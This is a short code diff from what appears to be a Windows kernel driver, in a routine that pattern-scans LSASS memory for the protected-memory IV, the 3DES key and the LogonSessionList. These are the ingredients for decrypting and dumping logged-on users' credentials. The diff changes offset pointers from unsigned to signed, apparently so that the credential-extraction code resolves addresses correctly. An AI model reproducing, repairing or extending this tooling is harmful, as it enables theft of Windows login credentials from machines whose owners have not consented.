@@ -912,7 +912,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 			break;
 		}
 		// Getting the IV
-		PULONG ivAddressOffset = static_cast<PULONG>(FindPattern(IvSignaturePattern, lsaInitializeProtectedMemory, 
+		PLONG ivAddressOffset = static_cast<PLONG>(FindPattern(IvSignaturePattern, lsaInitializeProtectedMemory, 
 			LsaInitializeProtectedMemoryDistance, &foundIndex, UserMode));
 
 		if (!ivAddressOffset) {
@@ -923,7 +923,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 			(*ivAddressOffset) + foundIndex);
 
 		// Getting 3DES key
-		PULONG desKeyAddressOffset = static_cast<PULONG>(FindPattern(DesKeySignaturePattern, lsaInitializeProtectedMemory, 
+		PLONG desKeyAddressOffset = static_cast<PLONG>(FindPattern(DesKeySignaturePattern, lsaInitializeProtectedMemory, 
 			LsaInitializeProtectedMemoryDistance, &foundIndex, UserMode));
 
 		if (!desKeyAddressOffset) {
@@ -953,7 +953,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 		lsassMetadata.DesKey->pKey = desKey->pKey;
 
 		// Getting LogonSessionList
-		PULONG logonSessionListAddressOffset = static_cast<PULONG>(FindPatterns(LogonSessionListPatterns, 
+		PLONG logonSessionListAddressOffset = static_cast<PLONG>(FindPatterns(LogonSessionListPatterns, 
 			LogonSessionListPatternCount, lsaIGetNbAndDnsDomainNames, LogonSessionListDistance,
 			&foundIndex, UserMode));
 
